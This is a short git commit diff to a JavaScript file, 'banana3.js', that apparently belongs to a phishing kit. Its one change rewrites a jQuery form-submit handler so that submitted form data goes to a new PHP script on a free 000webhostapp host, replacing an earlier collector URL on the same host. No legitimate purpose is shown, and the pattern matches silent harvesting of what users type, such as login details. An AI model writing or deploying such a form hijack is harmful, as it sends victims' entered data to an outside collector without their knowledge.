7b25d68c04742aa14f1a47991324d9c47e19624b
susumilkuenak <alberciokarambia@hotmail.com>
2024-05-17 00:24:48 +0800

    Update banana3.js

--- jonsbo/cupboard/banana3.js
+++ jonsbo/cupboard/banana3.js
@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://maitrivmyadventureex.000webhostapp.com/super/cocok3.php");
+  $(myform).attr("action", "https://maitrivmyadventureex.000webhostapp.com/lombo/sado.php");
 });
